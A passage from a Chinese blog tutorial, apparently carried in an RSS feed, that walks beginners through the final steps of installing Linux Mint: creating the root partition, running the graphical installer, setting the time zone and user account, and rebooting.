<p>那么同上操作，我们来分<code>根分区</code>，类型主分区，文件系统EXT4，挂载点<code>/</code>，大小将剩下的容量全部给它。</p>
<p></p>
<p>之后分区基本上就完成了</p>
<p></p>
<h4 id="开始全自动安装">开始全自动安装</h4>
<p>现在我们可以安装了，点击 <strong>“现在安装”</strong> 即可，接下来会弹出一个提示，内容如图，点击 <strong>“继续”</strong> 即可。</p>
<p></p>
<p>接下来就会要你选择地区了，这个决定了系统的时区，一定要根据实际情况选择，我们选择上海。然后点击 <strong>“继续”</strong></p>
<p></p>
<p>然后设置什么姓名啊计算机名啊用户名啊密码啊什么的，这些可以随便写，但是你一定要记住你写的用户名和密码是什么。</p>
<p>下面有一个加密主目录，可选可不选，意思是把你的用户目录进行加密，我就不选了，没必要。</p>
<p>写好选好以后，点击继续即可。</p>
<p></p>
<p>接下来就会开始安装了，全自动哦～去喝杯奶茶慢慢等吧。</p>
<p></p>
<p></p>
<p>一直等就好。</p>
<p>直到出现了这个窗口</p>
<p></p>
<p>那么恭喜你，你安装成功了！点击<strong>现在重启</strong>。 如果你出现了这个，虚拟机把虚拟光驱卸掉按回车即可，物理机则拔掉U盘按回车即可。</p>
<p>（物理机一般不会出现这个）</p>
<p></p>
<p>接下来如果没出问题的话，就进入系统了。</p>
<p>登录你刚刚设置的用户和密码，好好享受吧。</p>
<p></p>
<hr>
<h2 id="总结">总结</h2>
<p>稍微总结一下，Linux Mint是对新手比较友好的一份Linux发行版，它的安装过程也是非常简单的，基本上都是图形操作点点点。所以非常推荐新手学习使用</p>
<p>另外，本博客仅供参考和学习，如果出现其他问题请自行百度。</p>
<p>如需转载，请注明出处。</p>
]]></description>
</item></channel>
</rss>
